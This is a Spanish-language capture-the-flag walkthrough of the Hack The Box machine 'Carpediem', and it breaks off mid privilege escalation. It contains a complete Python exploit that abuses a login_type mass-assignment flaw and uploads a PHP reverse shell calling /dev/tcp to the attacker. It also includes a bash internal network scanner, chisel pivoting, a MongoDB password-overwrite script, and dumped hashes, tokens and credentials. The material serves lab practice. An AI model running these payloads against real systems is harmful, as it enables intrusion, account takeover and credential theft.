/etc/hosts: echo &quot;10.10.11.167 carpediem.htb&quot; &amp;gt;&amp;gt; /etc/hostsLamentablemente no se aplica y nos encontramos en la misma páginaLuego de enumerar directorios no encontramos nada interesante, así que intentamos enumerar subdominios:❯ gobuster vhost -t 100 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://carpediem.htb===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://carpediem.htb[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/09/05 16:03:05 Starting gobuster in VHOST enumeration mode===============================================================Found: portal.carpediem.htb (Status: 200) [Size: 31090] &amp;lt;---------------- Subdomain!Agregamos esté nuevo dominio a nuestro archivo /etc/hosts y encontramos la siguiente interfaz:Podemos enumerar tecnologías con la extensión Wappalyzer para saber que servidor web que corre por detrás, que lenguajes se aplican, etc.Pero de primeras obervamos la opción Login, entonces nos creamos una cuenta y entramos:Observamos en nuestra cuenta que tenemos un panel de reservas donde se almacenará el estado de nuestras reservas. Para comprobarlo intentamos hacer una reserva y nos muestra el siguiente mensaje:Si es cierto lo que dice el mensaje, posiblemente podríamos aplicar un Secuestro de sesión (Session hijacking) para robar la cookie de los administradores de la web y tener mayores privilegios. Sin embargo, después de esperar varios minutos no se lográ alterar el estado de nuestra petición, descartando así esta posible brecha de ataqueFootholdDespués de revisar la página y realizar una enumeración, encontramos la ruta /admin pero nos muestra lo siguiente:Sin embargo, al no estar logeados si nos deja acceder a la ruta /admin pero igualmente no podemos registrarnos. Es raro, así que para ver si existe una validación por detrás, usamos burpsuite para interceptar dicha petición:Observamos como respuesta la query de la consulta sobre la base de datos para validar el inicio de sessión, y vemos que pide que el campo login_type = 1. Probablemente no tengamos ese campo asignado. Para validar nuestros datos volvemos a nuestra sessión, y nos dirigimos al campo Manage Account:Para ver que otros datos corren por detrás, nuevamente interceptamos la petición con burpsuite y bingo:Observamos que tenemos el campo login_type=2, entonces lo cambiamos a 1 de manera exitosa, enviamos la petición, volvemos a la ruta /admin/ y tendremos acceso a la siguiente interfaz:Volviendo a revisar la página, encontramos el usuario Jeremy Hammond en la sección Booking List. Además, en la sección Quarterly Report Upload encontramos el mensaje “NOTE: Upload functions still in development!”. Revisando en código fuente encontramos lo siguiente:Vemos la función add_file, que por el código intuimos que sirve para subir archivos por método POST a la dirección \\_base_url\\_+&quot;classes/Users.php?f=upload&quot; (base_url se declara al principio del código como http://portal.carpediem.htb/).Entonces nos dirigimos a la ruta http://portal.carpediem.htb/classes/Users.php?f=upload:Nos aparece el mensaje {“error”:”multipart\\/form-data missing”} que sabemos que es parte de la cabezara Content-Type, la cuál es usada para indicar el tipo de recurso que se está pasando por la petición. Recordemos que para pasar un archivo necesitamos seguir un patrón válido. Especialmente para el Content-Type: multipart/form-data, necesitamos usar el campo boundary, el cúal sirve como delimitador para la data que pasaremos (puede tomar cualquier valor)Agregamos el Content-Type, el boundary, el nombre del archivo (filename), y el nombre del campo (name) que especifíca el nombre asignado en la etiqueta html, el cuál logramos obtener su nombre al no ponerlo, ya que a principio no sabemos su nombre. Al final queda de esta manera:Exitosamente subimos el archivo y logramos ver su contenido:Ya que podemos subir archivos, entonces cargamos un archivo que ejecute una shell inversa a nuestra máquina. Como es costumbre, realizé un script en python paraautomatizar todo el proceso que vimos hasta el momento y conseguir la shell:import jsonimport randomimport requests # pip install requestsimport signalimport stringimport sysimport threading# variablestarget_host = &#39;10.10.11.167&#39; target_url = &#39;http://portal.carpediem.htb&#39; # configure DNS (/etc/hosts)IP = sys.argv[1]PORT = sys.argv[2]# ctrl+C (exit the script) def ctrl_handler(signum, frame): print(&#39;\\n[!] User Exit.&#39;); sys.exit(1)signal.signal(signal.SIGINT, ctrl_handler)# get random string (to create account)def get_randstr(length): return &#39;&#39;.join(random.choice(string.ascii_letters) for i in range(length))# register userdef register(session): user = get_randstr(5) headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;} post_data = &#39;&amp;amp;&#39;.join(( &#39;firstname={data}&#39;, &#39;lastname={data}&#39;, &#39;contact={data}&#39;, &#39;gender=Male&#39;, &#39;address=&#39;, &#39;username={data}&#39;, &#39;password={data}&#39;)).format(data=user) session.post(f&#39;{target_url}/classes/Master.php?f=register&#39;, data=post_data, headers=headers) return user# login userdef login(session, credentials): headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;} post_data = &#39;&amp;amp;&#39;.join(( &#39;username={data}&#39;, &#39;password={data}&#39;)).format(data=credentials) session.post(f&#39;{target_url}/classes/Login.php?f=login_user&#39;, data=post_data, headers=headers)# change privilegesdef change_privileges(session, user, user_id): headers = {&#39;Content-Type&#39; : &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;} post_data = &#39;&amp;amp;&#39;.join(( &#39;id={id}&#39;, &#39;login_type=1&#39;, # admin privileges (default=2) &#39;firstname={data}&#39;, &#39;lastname={data}&#39;, &#39;contact={data}&#39;, &#39;gender=Male&#39;, &#39;address=&#39;, &#39;username={data}&#39;, &#39;password=&#39;)).format(data=user, id=user_id) r = session.post(f&#39;{target_url}/classes/Master.php?f=update_account&#39;, data=post_data, headers=headers) if &#39;success&#39; not in r.text: return False else: return True# reverse shelldef reverse_shell(session): # listen to rev print(&#39;Open port {p} to receive the shell (g.e /usr/bin/nc -lvnp {p})&#39;.format(p=PORT)) input(&#39;Press any key to continue...&#39;) headers = {&#39;Content-Type&#39; : &#39;multipart/form-data; boundary=123456789&#39;} post_data = &quot;&quot;&quot;--123456789\\r\\nContent-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;rev_shell.php&quot;\\r\\n\\n&amp;lt;?php exec(&quot;/bin/bash -c &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1&#39;&quot;); ?&amp;gt;\\r\\n--123456789&quot;&quot;&quot;.format(IP, PORT) r = session.post(f&#39;{target_url}/classes/Users.php?f=upload&#39;, data=post_data, headers=headers) file_name = str(json.loads(r.text)[&#39;success&#39;]).split()[0] session.get(f&#39;{target_url}/{file_name}&#39;)# make requestdef request(): try: # create session s = requests.Session() s.get(target_url) # register user = register(s) # login login(s, user) # change account_type value user_id = 0 change_priv_thread = False while not change_priv_thread: change_priv_thread = threading.Thread(target=change_privileges, args=(s, user, user_id)) change_priv_thread.start() user_id += 1 # get reverse shell reverse_shell(s) except Exception as e: print(&#39;[x] %s&#39; % e); sys.exit(1)if __name__ == &#39;__main__&#39;: request() Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Aplicando los pasos anteriores nos logramos conectar como el usuario www-data:❯ python3 www-data_6.py 10.10.14.10 4444Open port 4444 to receive the shell (g.e /usr/bin/nc -lvnp 4444)Press any key to continue...───────────────────────────────────────────────────────────────────────────────❯ nc -lvnp 4444Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.11.167.Ncat: Connection from 10.10.11.167:55140.bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellwww-data@3c371615b7aa:/var/www/html/portal/uploads$Al realizar una enumeración básica encontramos que no estamos en la máquina objetivo y nos encontramos en otra red:www-data@3c371615b7aa:/var/www/html/portal$ hostname -I172.17.0.6 www-data@3c371615b7aa:/var/www/html/portal$ cat /etc/hosts127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.17.0.3 mysql a5004fe641ca172.17.0.6 3c371615b7aaAdemás, podemos asegurar que nos encontramos dentro de un contenedor Docker:www-data@3c371615b7aa:/var/www/html/portal$ ls -la / | grep docker-rwxr-xr-x 1 root root 0 Mar 24 15:34 .dockerenv &amp;lt;------------ file created by Dockerwww-data@3c371615b7aa:/var/www/html/portal$ cat /proc/1/cgroup &amp;lt;------ List control groups (all come from Docker)12:perf_event:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf11:cpuset:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf10:blkio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf9:devices:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf8:rdma:/7:net_cls,net_prio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf6:memory:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf5:hugetlb:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf4:cpu,cpuacct:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf3:pids:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf2:freezer:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf1:name=systemd:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf0::/system.slice/containerd.serviceEn los archivos de la web y en las variables de entorno (env) encontramos unas credenciales de MySQL del usuario portaldb y root, respectivamente. Nos nos serán de ayuda pero es bueno saberloCon mas enumeración encontramos un nuevo subdominio en el archivo Trudesk.php (nombre que enteriormente vimos en la web “portal”). En resumen, Trudek es una solución de tickets de soporte técnico de código abierto. Agregamos la ruta nuestro archivo /etc/hosts y vemos la siguiente interfaz:Como solo tenemos un panel de login, y no poseemos credenciales válidas, dejaremos esto para despuésYa que estamos en otra red, podemos escanear que hosts están disponibles y que puertos tienen abiertos. Para ello, usamos un script clásico en bash para reconocimiento:#!/bin/bash# Host discovery# --------------# check if the host if liveis_alive(){ # send ICMP packets and wait for response ping -c 1 $1 &amp;gt; /dev/null # check status code successful (= 0) [ $? -eq 0 ] &amp;amp;&amp;amp; echo Host $i: UP.}echo -e &quot;\\nHost discovery:\\n&quot;for i in 172.17.0.{1..255} do # run function and pass it to the background is_alive $i &amp;amp; disowndone# --------------# Port discovery# --------------echo -e &quot;\\nPort discovery:\\n&quot;declare -a hosts=(172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6)for host in &quot;${hosts[@]}&quot;do echo &quot;Host $host:&quot; for port in $(seq 1 36000) do timeout 1 bash -c &quot;echo &#39;&#39; &amp;gt; /dev/tcp/$host/$port &amp;amp;&amp;amp; echo -e &#39;\\tPort $port: OPEN&#39;&quot; 2&amp;gt;/dev/null &amp;amp; donedone; wait# -------------- Lo ejecutamos, probablemente tome su tiempo, pero vale la penawww-data@3c371615b7aa:/tmp$ ./portDiscovery.sh Host discovery:Host 172.17.0.1: UP.Host 172.17.0.4: UP.Host 172.17.0.2: UP.Host 172.17.0.6: UP.Host 172.17.0.5: UP.Host 172.17.0.3: UP.Port discovery:Host 172.17.0.1: &amp;lt;--- Host machine (10.10.11.167) Port 80: OPEN Port 22: OPENHost 172.17.0.2: Port 27017: OPEN &amp;lt;--- MongodbHost 172.17.0.3: Port 3306: OPEN &amp;lt;--- MySQL (classic protocol) Port 33060: OPEN &amp;lt;-- MySQL (X protocol)Host 172.17.0.4: Port 21: OPEN &amp;lt;--- FTP Port 80: OPEN &amp;lt;--- Http Port 443: OPEN &amp;lt;-- HttpsHost 172.17.0.5: Port 8118: OPEN &amp;lt;- TrudeskHost 172.17.0.6: &amp;lt;--- Were are here Port 80: OPEN Puedes encontrar el script en mi repositorio https://github.com/E1P0TR0Observamos varios puertos conocidos y los enlazamos con sus respectivos Servicios. Empezamos con el host 172.17.0.2 (MongoDB), el cuál es un sistema de base de datos noSQLYa que nos encontramos en un contenedor y nos tenemos muchas herramienta, lo que hacemos es simples palabras es enviar el tráfico del puerto de nuestra máquina objetivo a un puerto de nuestra máquina local (Remote port Forwarding). Para ello usamos la herramienta chisel:www-data@3c371615b7aa:/tmp$ ./chisel client 10.10.14.10:1234 R:27017:172.17.0.2:27017 2022/09/06 03:16:42 client: Connecting to ws://10.10.14.10:12342022/09/06 03:16:43 client: Connected (Latency 107.222922ms)──────────────────────────────────────────────────────────────────────────────────────────────❯ ./chisel server -p 1234 --reverse2022/09/05 22:15:59 server: Reverse tunnelling enabled2022/09/05 22:15:59 server: Fingerprint nShNhlTjchKbgbrQZJUbJbiHDf9bMQpcNzs14TxFejY=2022/09/05 22:15:59 server: Listening on http://0.0.0.0:12342022/09/05 22:16:39 server: session#1: tun: proxy#R:27017=&amp;gt;172.17.0.2:27017: Listening───────────────────────────────────────────────────────────────────────────────────────────────❯ netstat -tlnp | grep 27017tcp6 0 0 :::27017 :::* LISTEN 10520/./chisel Puedes encontrar la herramienta chisel en su repositorio https://github.com/jpillora/chisel Aquí tienes más información sobre la creación de túneles con chisel y más https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.htmlCon el puerto en nuestra máquina local, ahora tenemos el servicio de MongoDB en nuestro puerto 27017 (puede ser cualquiera, pero por temas de orden y reconocimiento usamos el mismo). Para entrar a la base de datos usamos la herramienta mongo (shell interactiva en Javascript), y automáticamente de conectará como localhost al puerto 27017 (parámetros por defecto):❯ mongoMongoDB shell version v5.3.1connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;amp;gssapiServiceName=mongodbImplicit session: session { &quot;id&quot; : UUID(&quot;bb80bd61-3499-4d16-a3a4-39802bf17b68&quot;) }MongoDB server version: 5.0.6WARNING: shell and server versions do not match================Warning: the &quot;mongo&quot; shell has been superseded by &quot;mongosh&quot;,which delivers improved usability and compatibility.The &quot;mongo&quot; shell has been deprecated and will be removed inan upcoming release.For installation instructions, seehttps://docs.mongodb.com/mongodb-shell/install/================---The server generated these startup warnings when booting: &amp;lt;---------- Here! 2022-09-05T17:34:57.402+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem 2022-09-05T17:35:05.174+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted------ Enable MongoDB&#39;s free cloud-based monitoring service, which will then receive and display metrics about your deployment (disk utilization, CPU, operation statistics, etc). The monitoring data will be available on a MongoDB website with a unique URL accessible to you and anyone you share the URL with. MongoDB may use this information to make product improvements and to suggest MongoDB products and deployment options to you. To enable free monitoring, run the following command: db.enableFreeMonitoring() To permanently disable this reminder, run the following command: db.disableFreeMonitoring()--- Debido a la adevertencia, notamos que está herramienta será dada de baja, así que recomiendo usar mongosh más adelanteNi bien iniciamos mongo, notamos el siguiente mensaje generado por el servido al iniciar: “Access control is not enabled for the database. Read and write access to data and configuration is unrestricted”. Entonces nos dice que podemos leer y escribir en la base de datos?, eso es muy interesante.Primero enumeramos un poco:&amp;gt; show dbs [14/14]admin 0.000GB config 0.000GB local 0.000GBtrudesk 0.001GB&amp;gt; use admin switched to db admin &amp;gt; show collections system.users system.version &amp;gt; db.system.users.find() { &quot;_id&quot; : &quot;trudesk.trudesk&quot;, &quot;userId&quot; : UUID(&quot;91edf315-70ed-424b-8af5-df2be2559a88&quot;), &quot;user&quot; : &quot;trudesk&quot;, &quot;db&quot; : &quot;trudesk&quot;, &quot;credentials&quot; : { &quot;SCRAM-SHA-1&quot; : { &quot;iterationCount&quot; : 10000, &quot;salt&quot; : &quot;Ko2s2ZtnyVXoPkj8V9swbQ==&quot;, &quot;storedKey&quot; : &quot;RMcvISwRJ/G3Phy536k7qXNxrwY=&quot;, &quot;serverKey&quot; : &quot;DVRoL2j5ZNdejyf6TxM7XiD+vzw=&quot; }, &quot;SCRAM-SHA-256&quot; : { &quot;iterationCount&quot; : 15000, &quot;salt&quot; : &quot;R8aRmvuyjDHYUIpv28g/p5k3KVexBC4URSbE/g==&quot;, &quot;storedKey&quot; : &quot;II/yV9Z2qyjX7TDXYI+Zqh3903ZeTtmiT082SH7k0CY=&quot;, &quot;serverKey&quot; : &quot;8J62Bb5ugt2OJalKj1NMq6FFsyFLhRpxXMRSmR9EeDM=&quot; } }, &quot;roles&quot; : [ { &quot;role&quot; : &quot;userAdmin&quot;, &quot;db&quot; : &quot;trudesk&quot; } ] } Por el output 0.00GB puedes pensar que no hay nada, pero es falso, existe información como el usuario trudesk que es administradorVemos que está la base de datos Trudesk y podemos enlazarlo con la página que encontramos antes. En otras palabras, tenemos en nuestras manos la base de datos de el sistema Trudesk (el login page que vimos anteriormente). Encontramos muchas tablas, y una importante, la de cuentas:&amp;gt; use trudeskswitched to db trudesk&amp;gt; show collectionsaccountscountersdepartmentsgroupsmessagesnotificationsprioritiesrole_orderrolessessionssettingstagsteamstemplatesticketstickettypes&amp;gt; db.accounts.find(){ &quot;_id&quot; : ObjectId(&quot;623c8b20855cc5001a8ba13c&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS&quot;, &quot;fullname&quot; : &quot;Robert Frost&quot;, &quot;email&quot; : &quot;rfrost@carpediem.htb&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba138&quot;), &quot;title&quot; : &quot;Sr. Network Engineer&quot;, &quot;accessToken&quot; : &quot;22e56ec0b94db029b07365d520213ef6f5d3d2d9&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-04-07T20:30:32.198Z&quot;) }{ &quot;_id&quot; : ObjectId(&quot;6243c0be1e0d4d001b0740d4&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;jhammond&quot;, &quot;email&quot; : &quot;jhammond@carpediem.htb&quot;, &quot;password&quot; : &quot;$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq&quot;, &quot;fullname&quot; : &quot;Jeremy Hammond&quot;, &quot;title&quot; : &quot;Sr. Systems Engineer&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba139&quot;), &quot;accessToken&quot; : &quot;a0833d9a06187dfd00d553bd235dfe83e957fd98&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-04-01T23:36:55.940Z&quot;) }{ &quot;_id&quot; : ObjectId(&quot;6243c28f1e0d4d001b0740d6&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;jpardella&quot;, &quot;email&quot; : &quot;jpardella@carpediem.htb&quot;, &quot;password&quot; : &quot;$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK&quot;, &quot;fullname&quot; : &quot;Joey Pardella&quot;, &quot;title&quot; : &quot;Desktop Support&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba139&quot;), &quot;accessToken&quot; : &quot;7c0335559073138d82b64ed7b6c3efae427ece85&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-04-07T20:33:20.918Z&quot;) }{ &quot;_id&quot; : ObjectId(&quot;6243c3471e0d4d001b0740d7&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;acooke&quot;, &quot;email&quot; : &quot;acooke@carpediem.htb&quot;, &quot;password&quot; : &quot;$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.&quot;, &quot;fullname&quot; : &quot;Adeanna Cooke&quot;, &quot;title&quot; : &quot;Director - Human Resources&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba139&quot;), &quot;accessToken&quot; : &quot;9c7ace307a78322f1c09d62aae3815528c3b7547&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-03-30T14:21:15.212Z&quot;) }{ &quot;_id&quot; : ObjectId(&quot;6243c69d1acd1559cdb4019b&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;svc-portal-tickets&quot;, &quot;email&quot; : &quot;tickets@carpediem.htb&quot;, &quot;password&quot; : &quot;$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW&quot;, &quot;fullname&quot; : &quot;Portal Tickets&quot;, &quot;title&quot; : &quot;&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba13a&quot;), &quot;accessToken&quot; : &quot;f8691bd2d8d613ec89337b5cd5a98554f8fffcc4&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-03-30T13:50:02.824Z&quot;) }Como primer usuario vemos el nombre de admin, eso ya es sospechoso, así que intentamos actualizar su contraseña: Análisis de contraseña Necesitamos generar una contraseña de formato bcrypt, para ello usamos python:import bcryptpassword = b&#39;bestpassword123&#39;salt = bcrypt.gensalt()password_hash = bcrypt.hashpw(password, salt)print(password_hash.decode())# Output# $2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs. Volvemos a la base de datos y actualizamos la contraseña&amp;gt; db.accounts.update({&quot;username&quot;:&quot;admin&quot;}, {$set: {&quot;password&quot; : &quot;$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.&quot;}})WriteResult({ &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 })&amp;gt; db.accounts.find({&quot;username&quot;:&quot;admin&quot;}){ &quot;_id&quot; : ObjectId(&quot;623c8b20855cc5001a8ba13c&quot;), &quot;preferences&quot; : { &quot;tourCompleted&quot; : false, &quot;autoRefreshTicketGrid&quot; : true, &quot;openChatWindows&quot; : [ ] }, &quot;hasL2Auth&quot; : false, &quot;deleted&quot; : false, &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.&quot;, &quot;fullname&quot; : &quot;Robert Frost&quot;, &quot;email&quot; : &quot;rfrost@carpediem.htb&quot;, &quot;role&quot; : ObjectId(&quot;623c8b20855cc5001a8ba138&quot;), &quot;title&quot; : &quot;Sr. Network Engineer&quot;, &quot;accessToken&quot; : &quot;22e56ec0b94db029b07365d520213ef6f5d3d2d9&quot;, &quot;__v&quot; : 0, &quot;lastOnline&quot; : ISODate(&quot;2022-04-07T20:30:32.198Z&quot;) }Ahora volvemos a al subdominio de antes trudesk.carpediem.htb, nos logeamos como admin y la contraseña bestpassword123 y logramos entrarPara automatizar el proceso podemos crear un script en javascript que se encargue de actualizar la constraseña:// get database objectdb = new Mongo().getDB(&#39;trudesk&#39;);// to specify uservar username = &quot;admin&quot;var new_password = &quot;$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.&quot; // bestpassword123// view administrator passwordprint(&quot;Old information :&quot;)cursor = db.accounts.find({ &quot;username&quot; : username});while (cursor.hasNext()) { printjson(cursor.next());}// update administrator passwordprint(&quot;[Password updated!]&quot;)db.accounts.update({ &quot;username&quot; : username }, { $set: { &quot;password&quot; : new_password }});// verify new passwordprint(&quot;New information :&quot;)cursor = db.accounts.find({ &quot;username&quot; : username});while (cursor.hasNext()) { printjson(cursor.next());} Para ejecutarlo solo se lo pasamos como parámetro a mongo y se ejecutará automáticamente Este script y los anteriores los puedes encontrar en mi repositorio https://github.com/E1P0TR0 Aquí mas información sobre la actualización de datos en mondodb https://www.mongodb.com/docs/manual/reference/operator/update/set/Una vez dentro nos encontramos con la siguiente interfaz:Después de enumerar cada sección, nos encontramos una sobre los diferentes tickets del equipo. Aquí encontramos información enlazada a las vulnerabilidades que explotamos anteriormenteHay un solo ticket que nos manda Adeanna Cooke sobre el ingreso de un nuevo Ingeniero de Redes, el cúal necesita que configuren sus credenciales y teléfono. Entonces nosotros como usuario Robert Frost nos comprometemos a hacer dicha tarea:Revisando la conversación se habla del sistema VoIP, acrónimo de Voz sobre Protocolo de Internet (Voice Over Internet Protocol). También menciona que le dejo por mensaje de voz la credenciales de este nuevo empleado. Además hablan sobre una aplicación Zoiper, el cuál es un software multiplataforma diseñado para trabajar con sus sistemas de comunicación IP basado en el protocolo SIP (lo que mencionamos anteriormente).Como todo va tomando relación, buscando en internet sobre esta aplicación y logramos descargala con éxito:Observamos que necesitamos un usuario y contraseña. Esta parte es cuestión de relacionar la información y pensar un poco. Luego de ello y analizando bien la conversación podemos deducir las credenciales: 9650@carpediem.htb:2022 (hostname: carpediem.htb)Una vez dentro marcamos en la interfaz *62 para escuchar nuestra bandeja de mensajes de voz y con ello nuestra contraseña del servidor: AuRj4pxq9qPkAhora podemos usar esas credencial para intenrar logearnos por SSH, con el usuario hflaccus (del nombre Horacio Flaccus que se mencionaba en los mensajes, y la abreviación siguiendo el patrón de los demás usuarios). Una vez dentro logramos conseguir la flag:❯ sshpass -p &#39;AuRj4pxq9qPk&#39; ssh hflaccus@10.10.11.167Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-97-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 06 Sep 2022 05:01:49 AM UTC System load: 0.1 Processes: 256 Usage of /: 73.3% of 9.46GB Users logged in: 0 Memory usage: 29% IPv4 address for docker0: 172.17.0.1 &amp;lt;--- we confirm docker again! Swap usage: 0% IPv4 address for eth0: 10.10.11.167 * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation10 updates can be applied immediately.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updatehflaccus@carpediem:~$ find / -name flag.txt 2&amp;gt;/dev/null | xargs ls -ltotal 4-rw-r----- 1 root hflaccus 33 Sep 6 04:48 user.txtPrivilege EscalationEmpezamos con un reconocimiento básico del sistema listando el sistema operativo, la distribución, las interfaces de red, etc. Como usuario listamos si tenemos binarios para ejecutar como sudo o binarios SUID del sistema. No encontramos algo interesante, así que tirando de Linpeas (herramienta para enumeración en Linux para escalar privilegios) encontramos cosas interesantes:hflaccus@carpediem:/tmp$ ./linpeas.sh &amp;gt; linpeas_enumeration...══╣ Possible private SSH keys were found!/etc/ssl/certs/backdrop.carpediem.htb.key...╔══════════╣ Capabilities╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilitiesCurrent env capabilities:Current: =Current proc capabilities: CapInh: 0000000000000000CapPrm: 0000000000000000CapEff: 0000000000000000 CapBnd: 0000003fffffffffCapAmb: 0000000000000000Parent Shell capabilities: 0x0000000000000000=Files with capabilities (limited to 50): /usr/bin/ping = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip &amp;lt;---- sniffing/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep... Puedes encontrar linpeas en su repositorio https://github.com/carlospolop/PEASS-ngEncontramos una llave privada del dominio backdrop.carpediem.htb y además las capabilities para poder usar el binario tcpdump, que en pocas palabras sirve para olfatear/analizar tráfico en una comunicación. ¿ Qué son capabilities ? Son atributos especiales en el Kernel de Linux que dividen los privilegios disponibles para los procesos que se ejecutan como usuario root en grupos mas pequeños de privilegiosExiste una lista de capabilities que podemos asignar a cada usuarioCada capability puede tener 3 valores: P(permitted): Marca la capability como habilitada. Ahora esta podrá tener el valor de Effective o Inheritable E(Effective): Aplica la capability al proceso definido I(Inheritable): La pueden heredar los subprocesosEntonces ya podemos tener mas claro esto:/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip &amp;lt;-- e + i + p (habilitada, efectiva y heredable) \\ \\_________ use RAW and PACKET sockets, etc \\______________________ Perform various network-related operations, etcCon respecto al nuevo dominio, lo agregamos nuevamente a nuestro /etc/hosts y nos redirige a la primera página. Sin embargo, si recordamos nuestra enumeración de hosts, recordamos que teniamos varias interfaces:# portDiscovery.sh Host discovery:Host 172.17.0.1: UP.Host 172.17.0.4: UP.Host 172.17.0.2: UP.Host 172.17.0.6: UP.Host 172.17.0.5: UP.Host 172.17.0.3: UP.Port discovery:Host 172.17.0.1: &amp;lt;--- Host machine (carpediem.htb / 10.10.11.167) Port 80: OPEN Port 22: OPENHost 172.17.0.2: &amp;lt;-- MongoDB Port 27017: OPENHost 172.17.0.3: &amp;lt;-- MySQL Port 3306: OPEN Port 33060: OPEN Host 172.17.0.4: &amp;lt;--- ? Port 21: OPEN Port 80: OPEN Port 443: OPEN Host 172.17.0.5: &amp;lt;--- 